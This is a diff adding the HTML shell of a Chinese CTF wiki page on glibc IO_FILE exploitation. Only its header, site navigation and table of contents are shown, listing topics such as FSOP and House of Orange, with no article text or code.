@@ -1,0 +1,2883 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="SkYe Wiki">
+      
+      
+      
+        <meta name="author" content="SkYe231">
+      
+      
+        <link rel="canonical" href="https://wiki.mrskye.cn/Pwn/IO_FILE/Pwn_IO_FILE/">
+      
+      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.4">
+    
+    
+      
+        <title>Pwn_IO_FILE - SkYe Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.15aa0b43.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.75751829.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#ffffff">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback">
+        <style>body,input{font-family:"Noto Sans",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+        
+<script>window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-36723568-3","wiki.mrskye.cn"),ga("set","anonymizeIp",!0),ga("send","pageview"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){if(this.value){var e=document.location.pathname;ga("send","pageview",e+"?q="+this.value)}})}),document.addEventListener("DOMContentSwitch",function(){ga("send","pageview",document.location.pathname)})</script>
+<script async src="https://www.google-analytics.com/analytics.js"></script>
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="white" data-md-color-accent="green">
+      
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#pwn-_io_file" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="https://wiki.mrskye.cn/" title="SkYe Wiki" class="md-header-nav__button md-logo" aria-label="SkYe Wiki">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            SkYe Wiki
+          </span>
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            
+              Pwn_IO_FILE
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header-nav__source">
+        
+<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    skyedai910/wiki.mrskye.cn
+  </div>
+</a>
+      </div>
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="https://wiki.mrskye.cn/" title="SkYe Wiki" class="md-nav__button md-logo" aria-label="SkYe Wiki">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>
+
+    </a>
+    SkYe Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      
+<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    skyedai910/wiki.mrskye.cn
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  
+
+
+  
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1" checked>
+    
+    <label class="md-nav__link" for="nav-1">
+      Pwn
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Pwn" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        <span class="md-nav__icon md-icon"></span>
+        Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  
+
+
+  
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-1" type="checkbox" id="nav-1-1" checked>
+    
+    <label class="md-nav__link" for="nav-1-1">
+      IO_FILE
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="IO_FILE" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-1">
+        <span class="md-nav__icon md-icon"></span>
+        IO_FILE
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../glibc2.24%E4%B8%8BIO_FILE%E7%9A%84%E5%88%A9%E7%94%A8/" class="md-nav__link">
+      libc2.24下IO_FILE的利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Pwn_IO_FILE
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
+    <a href="./" class="md-nav__link md-nav__link--active">
+      Pwn_IO_FILE
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#io" class="md-nav__link">
+    IO 结构体知识
+  </a>
+  
+    <nav class="md-nav" aria-label="IO 结构体知识">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_io_file" class="md-nav__link">
+    _IO_FILE 结构
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_io_file_plus" class="md-nav__link">
+    _IO_FILE_plus 结构
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_io_jump_t" class="md-nav__link">
+    _IO_jump_t 结构
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    小结
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    涉及文件流部分函数
+  </a>
+  
+    <nav class="md-nav" aria-label="涉及文件流部分函数">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fread" class="md-nav__link">
+    fread
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fwrite" class="md-nav__link">
+    fwrite
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fopen" class="md-nav__link">
+    fopen
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fclose" class="md-nav__link">
+    fclose
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#printfputs" class="md-nav__link">
+    printf/puts
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vtable" class="md-nav__link">
+    伪造 vtable 劫持程序流程
+  </a>
+  
+    <nav class="md-nav" aria-label="伪造 vtable 劫持程序流程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    简介
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    原理示例
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    小结
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    例题
+  </a>
+  
+    <nav class="md-nav" aria-label="例题">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#2018-hctf-the_end" class="md-nav__link">
+    2018 HCTF the_end
+  </a>
+  
+    <nav class="md-nav" aria-label="2018 HCTF the_end">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    基本情况
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    思路
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#fsop" class="md-nav__link">
+    FSOP
+  </a>
+  
+    <nav class="md-nav" aria-label="FSOP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    介绍
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    原理示例
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    例题
+  </a>
+  
+    <nav class="md-nav" aria-label="例题">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ciscn_2019_n_7" class="md-nav__link">
+    ciscn_2019_n_7
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    基本情况
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    漏洞
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp" class="md-nav__link">
+    EXP
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#glibc-224" class="md-nav__link">
+    glibc 2.24 利用
+  </a>
+  
+    <nav class="md-nav" aria-label="glibc 2.24 利用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    新增防御机制
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_io_str_jumps" class="md-nav__link">
+    _IO_str_jumps
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_io_wstr_jumps" class="md-nav__link">
+    _IO_wstr_jumps
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_dl_fini" class="md-nav__link">
+    修改 _dl_fini 函数指针
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#house-of-orange" class="md-nav__link">
+    House of orange
+  </a>
+  
+    <nav class="md-nav" aria-label="House of orange">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    概述
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    使用条件
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hitcon_2016_houseoforange" class="md-nav__link">
+    hitcon_2016_houseoforange
+  </a>
+  
+    <nav class="md-nav" aria-label="hitcon_2016_houseoforange">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    基本情况
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp_1" class="md-nav__link">
+    EXP
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_21" class="md-nav__link">
+    参考文章
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_22" class="md-nav__link">
+    参考文章
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-2" type="checkbox" id="nav-1-2" >
+    
+    <label class="md-nav__link" for="nav-1-2">
+      Heap
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Heap" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-2">
+        <span class="md-nav__icon md-icon"></span>
+        Heap
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="md-nav__link">
+      堆基础知识
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/off_by_one/" class="md-nav__link">
+      off_by_one
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/fastbin/" class="md-nav__link">
+      fastbin attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/" class="md-nav__link">
+      堆重叠&拓展
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/use_after_free/" class="md-nav__link">
+      UAF
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/unlink/" class="md-nav__link">
+      Unlink
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/realloc/" class="md-nav__link">
+      realloc
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/unsorted_bin_attack/" class="md-nav__link">
+      unsorted_bin_attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/Libc2.29%E7%B1%BBunlink_attack/" class="md-nav__link">
+      libc2.29类unlink_attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/%E6%B2%99%E7%9B%92%E5%A0%86%E6%BA%A2%E5%87%BA/" class="md-nav__link">
+      沙盒堆溢出
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-2-11" type="checkbox" id="nav-1-2-11" >
+    
+    <label class="md-nav__link" for="nav-1-2-11">
+      House技术
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="House技术" data-md-level="3">
+      <label class="md-nav__title" for="nav-1-2-11">
+        <span class="md-nav__icon md-icon"></span>
+        House技术
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/House/House_Of_Force/House_Of_Force/" class="md-nav__link">
+      House_Of_Force
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/House/House_of_Lore/House_of_Lore/" class="md-nav__link">
+      House_of_Lore
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-3" type="checkbox" id="nav-1-3" >
+    
+    <label class="md-nav__link" for="nav-1-3">
+      格式化字符串
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="格式化字符串" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-3">
+        <span class="md-nav__icon md-icon"></span>
+        格式化字符串
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/" class="md-nav__link">
+      格式化字符串漏洞基础例子
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/" class="md-nav__link">
+      格式化字符串漏洞基础利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/" class="md-nav__link">
+      格式化字符串盲打
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" >
+    
+    <label class="md-nav__link" for="nav-2">
+      Stack
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Stack" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        <span class="md-nav__icon md-icon"></span>
+        Stack
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1" >
+    
+    <label class="md-nav__link" for="nav-2-1">
+      ROP
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="ROP" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-1">
+        <span class="md-nav__icon md-icon"></span>
+        ROP
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+      蒸米ROP笔记
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/" class="md-nav__link">
+      花式栈溢出技巧
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/SROP/srop/" class="md-nav__link">
+      SROP
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/Canary/" class="md-nav__link">
+      Canary
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB/" class="md-nav__link">
+      栈迁移
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/" class="md-nav__link">
+      fini_array劫持
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" >
+    
+    <label class="md-nav__link" for="nav-3">
+      Misc
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Misc" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        <span class="md-nav__icon md-icon"></span>
+        Misc
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/" class="md-nav__link">
+      文件的结构
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Misc/ZIP%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86/" class="md-nav__link">
+      ZIP压缩包伪加密
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Misc/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-volatility/" class="md-nav__link">
+      内存取证-volatility
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" >
+    
+    <label class="md-nav__link" for="nav-4">
+      Crypto
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Crypto" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        <span class="md-nav__icon md-icon"></span>
+        Crypto
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Crypto/CTF%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%ADpython%E5%BA%93%E5%BA%94%E7%94%A8/" class="md-nav__link">
+      CTF密码学中python库应用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Crypto/yafu%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/" class="md-nav__link">
+      yafu安装及使用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Crypto/RSA%E5%8A%A0%E5%AF%86%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+      RSA加密笔记
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#io" class="md-nav__link">
+    IO 结构体知识
+  </a>
+  
+    <nav class="md-nav" aria-label="IO 结构体知识">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_io_file" class="md-nav__link">
+    _IO_FILE 结构
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_io_file_plus" class="md-nav__link">
+    _IO_FILE_plus 结构
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_io_jump_t" class="md-nav__link">
+    _IO_jump_t 结构
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    小结
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    涉及文件流部分函数
+  </a>
+  
